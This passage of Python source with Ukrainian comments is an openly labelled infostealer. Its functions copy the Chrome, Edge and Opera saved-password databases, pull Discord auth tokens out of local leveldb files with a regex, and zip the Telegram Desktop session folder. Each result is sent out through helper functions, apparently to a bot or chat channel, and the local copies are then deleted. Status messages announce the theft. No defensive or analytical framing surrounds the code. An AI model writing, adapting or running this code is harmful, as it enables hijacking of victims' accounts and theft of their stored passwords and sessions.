def steal_browser_passwords():
    """Копіює бази паролів з браузерів"""
    sent = 0
    paths = {
        'chrome': os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        'edge': os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
        'opera': os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data")
    }
    for name, path in paths.items():
        if os.path.exists(path):
            try:
                shutil.copy2(path, f'{name}_login.db')
                send_file(f'{name}_login.db')
                os.remove(f'{name}_login.db')
                sent += 1
            except Exception:
                pass
    if sent > 0:
        send_message(f"✅ Надіслано {sent} файлів з паролями браузерів")
    else:
        send_message("❌ Паролі браузерів не знайдено")

def steal_discord_tokens():
    """Пошук токенів Discord у локальних файлах"""
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb")
    ]
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not (file.endswith('.ldb') or file.endswith('.log')):
                continue
            try:
                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                    data = f.read()
                    # регулярний вираз для пошуку токенів Discord
                    import re
                    found = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', data)
                    tokens.extend(found)
            except Exception:
                pass
    if tokens:
        unique = list(set(tokens))
        with open('discord_tokens.txt', 'w') as f:
            f.write('\n'.join(unique))
        send_file('discord_tokens.txt')
        os.remove('discord_tokens.txt')
        send_message(f"✅ Знайдено {len(unique)} токенів Discord")
    else:
        send_message("❌ Токени Discord не знайдено")

def steal_telegram_session():
    """Архівує папку з сесією Telegram"""
    tdata_path = os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata")
    if not os.path.exists(tdata_path):
        send_message("❌ Telegram не знайдено")
        return
    try:
        import zipfile
        zip_name = 'telegram_session.zip'
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(tdata_path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, tdata_path)
                    z.write(full_path, arcname)
        send_file(zip_name)
        os.remove(zip_name)
        send_message("✅ Сесія Telegram успішно вкрадена")
    except Exception as e:
        send_message(f"❌ Помилка при крадіжці Telegram: {e}")

